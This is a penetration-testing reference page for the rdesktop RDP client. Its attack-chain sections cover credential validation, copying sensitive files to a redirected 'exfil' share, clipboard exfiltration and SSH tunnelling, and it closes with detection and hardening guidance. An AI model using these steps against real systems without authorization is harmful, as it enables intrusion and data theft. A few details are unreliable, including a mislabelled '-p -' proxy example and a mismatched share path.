---
title: "rdesktop"
category: "Lateral Movement"
tool_name: "rdesktop"
version: "1.9.0"
kali_package: "rdesktop"
install_size: "692 KB"
language: "C"
author: "Matthew Chapman et al."
license: "GPL-3.0"
github: "https://github.com/rdesktop/rdesktop"
kali_url: "https://www.kali.org/tools/rdesktop/"
mitre_tactic: "lateral_movement"
mitre_tactic_id: "TA0008"
tags: ["lateral_movement", "rdp", "remote-desktop", "windows", "gui", "credential-access", "screen-capture", "clipboard"]
date: "2026-07-18"
---

# rdesktop — Remote Desktop Protocol Client

## 1. Overview

**rdesktop** is an open-source command-line RDP (Remote Desktop Protocol) client for Linux/Unix systems. It connects to Windows hosts running Terminal Services or Remote Desktop Services, providing full graphical desktop access over the RDP protocol. rdesktop implements RDP versions 4 and 5, supporting Windows NT 4 Terminal Server through Windows Server 2012 R2.

In penetration testing, rdesktop is used for lateral movement after obtaining valid Windows credentials. It provides a full GUI session on the remote host, enabling access to applications, files, and settings that are difficult to manage through command-line tools alone. rdesktop supports drive redirection, clipboard sharing, sound redirection, printer redirection, and smartcard passthrough.

**Note:** rdesktop is no longer actively maintained. For modern RDP clients, consider `xfreerdp` (FreeRDP) or `remmina`. However, rdesktop remains included in Kali Linux and is lightweight and functional for its supported protocol versions.

### Core Capabilities

- **Full graphical RDP session** on remote Windows hosts
- **Drive redirection** to mount local directories on the remote host
- **Clipboard sharing** between local and remote systems
- **Sound redirection** from remote host to local speakers
- **Printer redirection** for remote print jobs
- **Smartcard authentication** via PCSC-lite
- **SeamlessRDP mode** for individual application windows
- **TLS encryption** (versions 1.0, 1.1, 1.2)
- **Persistent bitmap caching** for performance
- **Keyboard layout mapping** for international keyboards
- **Console session attachment** for direct console access

### When to Use rdesktop

- Lateral movement with valid Windows credentials requiring GUI access
- Accessing Windows applications that require graphical interaction
- Managing Windows servers through Remote Desktop
- File transfer via drive redirection
- Clipboard-based data exfiltration during authorized engagements
- Smartcard-based authentication testing
- Environments where command-line tools are insufficient
- Lab environments for practicing RDP-based lateral movement

### Comparison with Other RDP Clients

| Feature | rdesktop | xfreerdp | remmina | mstsc (Windows) |
|---------|----------|----------|---------|-----------------|
| Platform | Linux/Unix | Linux/Unix | Linux/Unix | Windows |
| RDP versions | 4, 5 | 5, 6, 7, 8, 10 | 5, 6, 7, 8 | 5, 6, 7, 8, 10 |
| Drive redirection | Yes | Yes | Yes | Yes |
| Clipboard | Yes | Yes | Yes | Yes |
| Sound | Yes | Yes | Yes | Yes |
| Smartcard | Yes | Yes | Yes | Yes |
| NLA support | Limited | Yes | Yes | Yes |
| Maintained | No | Yes | Yes | Yes |
| CLI | Yes | Yes | GUI+CLI | GUI |

---

## 2. Installation

### Kali Linux (Default)

```bash
sudo apt install rdesktop
```

**Explanation:** Installs rdesktop and its dependencies: `libasound2`, `libc6`, `libgmp10`, `libgnutls30`, `libgssapi-krb5-2`, `libpcsclite1`, `libx11-6`, `libxcursor1`, `libxrandr2`. rdesktop is included in Kali's default, large, and everything metapackages.

### From Source

```bash
git clone https://github.com/rdesktop/rdesktop.git /opt/rdesktop
cd /opt/rdesktop
./bootstrap
./configure
make
sudo make install
```

**Explanation:** Builds rdesktop from source. The `./bootstrap` step is required for git clones (not release tarballs). The default install prefix is `/usr/local`. Use `--prefix=/usr` for system-wide installation.

### Smartcard Support

```bash
# Install PCSC-lite dependency
sudo apt install libpcsclite-dev

# Build with smartcard support
./configure --enable-smartcard
make
sudo make install
```

**Explanation:** Enables smartcard authentication support using PCSC-lite 1.2.9 or later. Required for testing smartcard-based RDP authentication.

### Verifying Installation

```bash
rdesktop
```

**Explanation:** Displays usage information and exits. If this produces output, the installation is correct. The banner shows the version (e.g., `Version 1.9.0`).

---

## 3. Command Reference

### 3.1 Basic Connection

```bash
rdesktop 192.168.1.10
```

**Explanation:** Connects to the target RDP server on the default port (3389). Opens a graphical window with the Windows login screen. Enter valid credentials to access the desktop.

### 3.2 Authentication with Username

```bash
rdesktop -u administrator -p 'P@ssw0rd' 192.168.1.10
```

**Explanation:** Connects with pre-filled credentials. The `-u` flag sets the username and `-p` sets the password. Use `-p -` to prompt for the password interactively (avoids password in process listing).

### 3.3 Domain Authentication

```bash
rdesktop -u administrator -p 'P@ssw0rd' -d CORP 192.168.1.10
```

**Explanation:** Authenticates to a domain account. The `-d` flag specifies the Windows domain. For workgroup authentication, use `-d .` or omit the flag.

### 3.4 Full Screen Mode

```bash
rdesktop -f -u administrator -p 'P@ssw0rd' 192.168.1.10
```

**Explanation:** Opens the RDP session in full-screen mode. The remote desktop fills the entire local screen. Press `Ctrl+Alt+Enter` to toggle full-screen mode during the session.

### 3.5 Desktop Geometry

```bash
rdesktop -g 1920x1080 -u administrator -p 'P@ssw0rd' 192.168.1.10
```

**Explanation:** Sets the remote desktop resolution to 1920x1080. Supports formats: `WxH`, `WxH@DPI`, `WxH+X+Y`. Use `-g workarea` to use 75% of the local screen.

#### Geometry Variants

```bash
# Fixed resolution
rdesktop -g 1280x720 192.168.1.10

# With DPI
rdesktop -g 1920x1080@120 192.168.1.10

# Offset position
rdesktop -g 1024x768+200+100 192.168.1.10

# Percentage of work area
rdesktop -g workarea 192.168.1.10
```

### 3.6 Drive Redirection

```bash
rdesktop -r disk:share=/mnt/remote -u administrator -p 'P@ssw0rd' 192.168.1.10
```

**Explanation:** Mounts the local `/mnt/remote` directory as a network share named `share` on the remote Windows host. Access it via `\\tsclient\share` in the remote session.

#### Multiple Drive Shares

```bash
rdesktop -r disk:share1=/mnt/data,share2=/tmp -u administrator -p 'P@ssw0rd' 192.168.1.10
```

**Explanation:** Mounts multiple local directories as shares. Each share is accessible via `\\tsclient\<sharename>` on the remote host.

### 3.7 Clipboard Redirection

```bash
rdesktop -r clipboard:CLIPBOARD -u administrator -p 'P@ssw0rd' 192.168.1.10
```

**Explanation:** Enables clipboard sharing between local and remote systems. Supports `CLIPBOARD` (system clipboard) and `PRIMARYCLIPBOARD` (both primary selection and clipboard). Default is `CLIPBOARD`.

#### Clipboard Variants

```bash
# Standard clipboard (default)
rdesktop -r clipboard:CLIPBOARD 192.168.1.10

# Both primary and clipboard
rdesktop -r clipboard:PRIMARYCLIPBOARD 192.168.1.10

# Disable clipboard
rdesktop -r clipboard:off 192.168.1.10
```

### 3.8 Sound Redirection

```bash
rdesktop -r sound:local -u administrator -p 'P@ssw0rd' 192.168.1.10
```

**Explanation:** Redirects remote audio to local speakers. Uses the ALSA driver by default. Available drivers: `alsa`, `oss`, `pulse`.

#### Sound Variants

```bash
# Redirect sound to local (ALSA)
rdesktop -r sound:local 192.168.1.10

# Redirect sound to local (PulseAudio)
rdesktop -r sound:local:pulse 192.168.1.10

# Disable sound
rdesktop -r sound:off 192.168.1.10

# Leave sound on remote
rdesktop -r sound:remote 192.168.1.10
```

### 3.9 Printer Redirection

```bash
rdesktop -r printer:myprinter -u administrator -p 'P@ssw0rd' 192.168.1.10
```

**Explanation:** Redirects a local printer to the remote session. The printer is available in the remote Windows session as "myprinter".

### 3.10 Serial Port Redirection

```bash
rdesktop -r comport:COM1=/dev/ttyS0 -u administrator -p 'P@ssw0rd' 192.168.1.10
```

**Explanation:** Redirects a local serial port to the remote host's COM port. Multiple serial ports can be redirected: `COM1=/dev/ttyS0,COM2=/dev/ttyS1`.

### 3.11 Parallel Port Redirection

```bash
rdesktop -r lptport:LPT1=/dev/lp0 -u administrator -p 'P@ssw0rd' 192.168.1.10
```

**Explanation:** Redirects a local parallel port to the remote host's LPT port.

### 3.12 Smartcard Authentication

```bash
rdesktop -i -u administrator -p '1234' -o sc-card-name="eToken" 192.168.1.10
```

**Explanation:** Enables smartcard authentication. The `-i` flag enables smartcard mode, the password is used as the PIN, and `-o sc-card-name` specifies the smartcard name. Requires PCSC-lite and `--enable-smartcard` at build time.

### 3.13 TLS Version Control

```bash
rdesktop -V 1.2 -u administrator -p 'P@ssw0rd' 192.168.1.10
```

**Explanation:** Forces TLS 1.2 for the RDP connection. Available versions: `1.0`, `1.1`, `1.2`. Default is negotiation (highest mutually supported version).

### 3.14 Keyboard Layout

```bash
rdesktop -k en-us -u administrator -p 'P@ssw0rd' 192.168.1.10
rdesktop -k de -u administrator -p 'P@ssw0rd' 192.168.1.10
rdesktop -k sv -u administrator -p 'P@ssw0rd' 192.168.1.10
```

**Explanation:** Sets the keyboard layout on the remote server. Common layouts: `en-us`, `de`, `sv`, `fr`, `ja`, `ko`, `zh-cn`. Prevents keyboard mapping issues with international keyboards.

### 3.15 Console Session

```bash
rdesktop -0 -u administrator -p 'P@ssw0rd' 192.168.1.10
```

**Explanation:** Attaches to the console session (session 0) instead of creating a new Terminal Services session. Useful for accessing the physical console session or managing server console applications.

### 3.16 SeamlessRDP Mode

```bash
rdesktop -A /usr/share/seamlessrdp/seamlessrdpshell.exe -u administrator -p 'P@ssw0rd' 192.168.1.10
```

**Explanation:** Opens individual remote applications as separate local windows instead of a full desktop session. The SeamlessRDP shell must be installed on the remote host.

### 3.17 Performance Tuning

```bash
# Modem connection (low bandwidth)
rdesktop -x m -u administrator -p 'P@ssw0rd' 192.168.1.10

# Broadband connection
rdesktop -x b -u administrator -p 'P@ssw0rd' 192.168.1.10

# LAN connection
rdesktop -x l -u administrator -p 'P@ssw0rd' 192.168.1.10

# Custom hex value for fine-tuning
rdesktop -x 0x8 -u administrator -p 'P@ssw0rd' 192.168.1.10
```

**Explanation:** Sets the RDP experience profile based on network speed. `m` = modem (28.8k), `b` = broadband, `l` = LAN. Affects compression, caching, and bitmap quality.

### 3.18 Bitmap Caching

```bash
rdesktop -P -u administrator -p 'P@ssw0rd' 192.168.1.10
```

**Explanation:** Enables persistent bitmap caching. Cached bitmaps are stored locally and reused across sessions, reducing bandwidth and improving performance on repeat connections.

### 3.19 RDP Version Selection

```bash
# Force RDP version 4
rdesktop -4 -u administrator -p 'P@ssw0rd' 192.168.1.10

# Force RDP version 5 (default)
rdesktop -5 -u administrator -p 'P@ssw0rd' 192.168.1.10
```

**Explanation:** Forces a specific RDP protocol version. RDP5 is the default and supports more features (bitmap caching, clipboard, sound). RDP4 is older and more limited but may work on legacy systems.

### 3.20 Encryption Control

```bash
# Disable encryption (French TS)
rdesktop -e -u administrator -p 'P@ssw0rd' 192.168.1.10

# Disable client-to-server encryption only
rdesktop -E -u administrator -p 'P@ssw0rd' 192.168.1.10
```

**Explanation:** `-e` disables all encryption (for French Terminal Servers with export restrictions). `-E` disables only client-to-server encryption. These are rarely needed in modern environments.

### 3.21 Window Management

```bash
# Custom window title
rdesktop -T "My Remote Desktop" 192.168.1.10

# Disable window manager decorations
rdesktop -D -u administrator -p 'P@ssw0rd' 192.168.1.10

# Keep window manager key bindings
rdesktop -K -u administrator -p 'P@ssw0rd' 192.168.1.10

# Embed in another window (X11 window ID)
rdesktop -X 0x12345678 192.168.1.10
```

**Explanation:** Controls window behavior. `-T` sets the window title, `-D` removes window decorations for cleaner appearance, `-K` passes key bindings to the window manager, and `-X` embeds the RDP session into an existing X11 window.

### 3.22 Mouse and Motion

```bash
# Disable motion events
rdesktop -m -u administrator -p 'P@ssw0rd' 192.168.1.10

# Use local mouse cursor
rdesktop -M -u administrator -p 'P@ssw0rd' 192.168.1.10
```

**Explanation:** `-m` disables motion events for slower connections. `-M` uses the local mouse cursor instead of the remote one.

### 3.23 Colour Depth

```bash
rdesktop -a 16 -u administrator -p 'P@ssw0rd' 192.168.1.10
```

**Explanation:** Sets the connection colour depth. Common values: `8` (256 colors), `15`, `16` (high color), `24`, `32` (true color). Lower values reduce bandwidth usage.

### 3.24 Compression

```bash
rdesktop -z -u administrator -p 'P@ssw0rd' 192.168.1.10
```

**Explanation:** Enables RDP compression. Reduces bandwidth usage at the cost of increased CPU usage on both client and server. Recommended for slower connections.

### 3.25 Additional Options

```bash
# Add an additional option
rdesktop -o sc-csp-name="Microsoft Base Smart Card Crypto Provider" 192.168.1.10
```

**Explanation:** Passes additional name=value options to rdesktop. Used primarily for smartcard configuration: `sc-csp-name`, `sc-container-name`, `sc-reader-name`, `sc-card-name`.

---

## 4. Connection Workflow

### Pre-Connection Checklist

```text
1. Verify RDP is enabled on target
   └─ Check port 3389 accessibility

2. Obtain valid credentials
   └─ Username, password, domain

3. Determine connection requirements
   └─ Resolution, drive sharing, clipboard, sound

4. Choose performance profile
   └─ Based on network bandwidth
```

### Connection Sequence

```text
1. TCP handshake on port 3389
   └─ rdesktop → target:3389

2. TLS negotiation
   └─ Version selection (1.0, 1.1, 1.2)
   └─ Certificate exchange

3. RDP protocol negotiation
   └─ Supported features exchange
   └─ Channel setup

4. Authentication
   └─ NTLM or Kerberos
   └─ Credentials submitted

5. Session establishment
   └─ Desktop displayed
   └─ User interaction begins
```

---

## 5. Attack Chain Integration

### Step 1: RDP Discovery

```bash
# Check if RDP is open
nmap -p 3389 192.168.1.10

# Check RDP version
nmap -sV -p 3389 192.168.1.10

# Test with rdesktop (will show login screen)
rdesktop 192.168.1.10
```

**Explanation:** Verify RDP accessibility before attempting full connection. Nmap can identify the RDP version and whether NLA (Network Level Authentication) is required.

### Step 2: Credential Validation

```bash
# Validate credentials with crackmapexec
crackmapexec smb 192.168.1.10 -u administrator -p 'P@ssw0rd'

# Or with evil-winrm
evil-winrm -i 192.168.1.10 -u administrator -p 'P@ssw0rd'
```

**Explanation:** Verify credentials are valid before opening an RDP session. Failed RDP attempts are logged and may trigger account lockouts.

### Step 3: RDP Connection

```bash
rdesktop -u administrator -p 'P@ssw0rd' -g 1280x720 -r disk:share=/mnt/data 192.168.1.10
```

**Explanation:** Connect to the target with drive sharing enabled. The `/mnt/remote` directory is accessible as `\\tsclient\share` on the remote host.

### Step 4: Data Exfiltration via Drive

```bash
# From the remote Windows session
copy C:\Users\Administrator\Desktop\sensitive.txt \\tsclient\share\

# Or via PowerShell
Copy-Item "C:\Users\Administrator\Desktop\sensitive.txt" "\\tsclient\share\"
```

**Explanation:** Use the redirected drive to transfer files between local and remote systems. Files appear on the local system in the mapped directory.

### Step 5: Clipboard Exfiltration

```bash
# Copy text locally, paste in remote session
# Or copy from remote, paste locally
# Clipboard sharing is automatic when enabled
```

**Explanation:** Clipboard sharing enables quick text transfer between local and remote. Sensitive data copied in the remote session is available locally and vice versa.

### Step 6: Persistence

```bash
# Add an SSH tunnel for persistent RDP access
ssh -L 3389:192.168.1.10:3389 user@192.168.1.5

# Then connect locally
rdesktop 127.0.0.1
```

**Explanation:** SSH tunneling wraps RDP traffic through an encrypted channel, providing persistent access and bypassing network restrictions.

---

## 6. Advanced Use Cases

### SSH Tunnel for RDP

```bash
# Create SSH tunnel
ssh -L 3389:192.168.1.10:3389 user@192.168.1.5

# Connect through tunnel
rdesktop 127.0.0.1

# With dynamic port forwarding
ssh -D 1080 user@192.168.1.5
rdesktop -p - 192.168.1.10  # Use proxy for RDP
```

**Explanation:** SSH tunneling encrypts RDP traffic and can bypass firewall rules. Dynamic port forwarding creates a SOCKS proxy for flexible routing.

### Multiple Sessions

```bash
# Session 1: Administrator desktop
rdesktop -u admin -p 'Pass1' -g 1920x1080 -T "Admin Desktop" 192.168.1.10 &

# Session 2: Different user
rdesktop -u user2 -p 'Pass2' -g 1280x720 -T "User2 Desktop" 192.168.1.10 &

# Session 3: Through tunnel
rdesktop -u admin -p 'Pass1' -T "Tunneled" 127.0.0.1 &
```

**Explanation:** Run multiple rdesktop sessions simultaneously. Each session runs as a separate process with its own window and configuration.

### Drive Redirection for File Transfer

```bash
# Mount local /tmp as a share
rdesktop -r disk:exfil=/tmp -u administrator -p 'P@ssw0rd' 192.168.1.10

# In the remote session, access as:
# \\tsclient\exfil

# Copy files to the share
copy C:\sensitive_data.txt \\tsclient\exfil\
```

**Explanation:** Drive redirection is the primary file transfer method in rdesktop. The redirected drive appears as a network share on the remote host.

### Clipboard-Based Data Exfiltration

```bash
# Enable clipboard (default)
rdesktop -r clipboard:CLIPBOARD -u administrator -p 'P@ssw0rd' 192.168.1.10

# In the remote session, copy text (Ctrl+C)
# It appears in the local clipboard (Ctrl+V)
```

**Explanation:** Clipboard sharing is enabled by default. Text copied in the remote session is available locally. This is useful for extracting small amounts of data quickly.

### Performance Optimization

```bash
# High-performance LAN connection
rdesktop -x l -z -P -a 32 -u administrator -p 'P@ssw0rd' 192.168.1.10

# Low-bandwidth connection
rdesktop -x m -z -a 8 -m -M -u administrator -p 'P@ssw0rd' 192.168.1.10
```

**Explanation:** `-x l` = LAN profile, `-z` = compression, `-P` = persistent caching, `-a 32` = true color. For low bandwidth, use modem profile with reduced color depth and no motion events.

### Attach to Console Session

```bash
# Attach to session 0 (console)
rdesktop -0 -u administrator -p 'P@ssw0rd' 192.168.1.10
```

**Explanation:** Connects to the physical console session instead of creating a new Terminal Services session. Useful for accessing applications that run only on the console or for troubleshooting display issues.

### Embed in Existing Window

```bash
# Get window ID
xwininfo | grep "Window id"

# Embed rdesktop in that window
rdesktop -X 0x12345678 192.168.1.10
```

**Explanation:** Embeds the RDP session into an existing X11 window. Useful for integrating remote desktop into custom desktop environments or automation workflows.

---

## 7. Detection and Defense

### RDP Connection Indicators

| Indicator | Detection Method |
|-----------|-----------------|
| RDP connections on 3389 | Network monitoring on TCP 3389 |
| RDP event logs | Windows Event ID 4624 (Logon Type 10) |
| RDP session creation | Windows Event ID 4624 (Logon Type 10) |
| Clipboard data transfer | DLP monitoring on clipboard operations |
| Drive redirection | File integrity monitoring on redirected drives |
| Bitmap caching | Local cache file creation |
| TLS connections | Certificate-based detection |

### Network Detection

```bash
# Wireshark filter for RDP traffic
tcp.port == 3389

# Suricata rule (conceptual)
alert tcp any any -> any 3389 (msg:"RDP Connection"; \
    content:"|03 00 00|"; sid:1000003;)

# Zeek detection
export HIGHLIGHT_RDP=T
```

### Blue Team Detection Queries

```text
# Splunk: Detect RDP logons
index=windows EventCode=4624 LogonType=10
| stats count by Computer, Account_Name, Ip_Address
| where count > 0

# Elastic: Detect RDP sessions
event_id:4624 AND logon_type:10
| stats count by host, winlog.event_data.TargetUserName, winlog.event_data.IpAddress
```

### Preventive Controls

```text
# Restrict RDP access via Windows Firewall
New-NetFirewallRule -DisplayName "Allow RDP" -Direction Inbound \
    -Protocol TCP -LocalPort 3389 -RemoteAddress 10.0.0.0/8 -Action Allow

# Block RDP from external sources
New-NetFirewallRule -DisplayName "Block RDP External" -Direction Inbound \
    -Protocol TCP -LocalPort 3389 -RemoteAddress 0.0.0.0/0 -Action Block

# Enable NLA (Network Level Authentication)
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1

# Restrict RDP users
net localgroup "Remote Desktop Users" /delete
net localgroup "Remote Desktop Users" administrator /add

# Disable RDP if not needed
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 1

# Audit RDP connections
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
```

---

## 8. Operational Considerations

### Advantages

- **Lightweight:** 692 KB install size, minimal dependencies
- **Fast:** Minimal overhead compared to full-featured RDP clients
- **CLI-based:** Scriptable and automatable
- **Drive redirection:** Built-in file transfer capability
- **Clipboard sharing:** Quick text transfer between systems
- **Wide compatibility:** Works with Windows NT 4 through Server 2012 R2

### Limitations

- **No longer maintained:** Security vulnerabilities unpatched
- **RDP 4/5 only:** Does not support modern RDP features (NLA, RemoteFX, H.264)
- **Limited NLA support:** May fail against NLA-required servers
- **No GUI configuration:** All options must be specified via command line
- **No session management:** Cannot save connection profiles
- **X11 dependent:** Requires X11 display server (not available on headless systems without X forwarding)
- **No certificate pinning:** Susceptible to MITM attacks on RDP connections

### Troubleshooting

| Issue | Cause | Solution |
|-------|-------|----------|
| `Connection refused` | RDP disabled or port blocked | Verify RDP is enabled; check firewall |
| `Connection timed out` | Network unreachable | Ping target; check routing |
| `Protocol error` | NLA required | Use xfreerdp or enable NLA-less RDP |
| Black screen | Resolution mismatch | Try `-g 1024x768` |
| Keyboard issues | Wrong layout | Use `-k en-us` |
| No sound | ALSA not configured | Check `alsamixer`; use `-r sound:local` |
| Clipboard not working | Clipboard disabled | Ensure `-r clipboard:CLIPBOARD` |
| Drive not accessible | Share path wrong | Access via `\\tsclient\<sharename>` |

### Best Practices

- Always use `-p -` to prompt for passwords (avoids password in process listing)
- Use SSH tunneling for encrypted RDP over untrusted networks
- Enable NLA on target systems to prevent credential theft
- Monitor for RDP logon events (Event ID 4624, Logon Type 10)
- Document all RDP sessions in the engagement report
- Use drive redirection for file transfer instead of clipboard (more reliable)
- Consider xfreerdp as a maintained alternative for modern environments
- Test RDP connectivity before opening full sessions (use `nmap -p 3389`)

---

## Resources

- **rdesktop GitHub:** https://github.com/rdesktop/rdesktop
- **rdesktop Homepage:** http://www.rdesktop.org/
- **rdesktop Man Page:** `man rdesktop`
- **Kali Linux Tool Page:** https://www.kali.org/tools/rdesktop/
- **MITRE ATT&CK Lateral Movement (TA0008):** https://attack.mitre.org/tactics/TA0008/
- **MITRE ATT&CK Remote Services (T1021):** https://attack.mitre.org/techniques/T1021/
- **OffSec PEN-200 Course:** https://www.offsec.com/courses/pen-200/
- **FreeRDP (modern alternative):** https://github.com/FreeRDP/FreeRDP
- **Remmina (GUI alternative):** https://remmina.org/
- **Microsoft RDP Documentation:** https://docs.microsoft.com/en-us/windows-server/remote/remote-desktop-services/
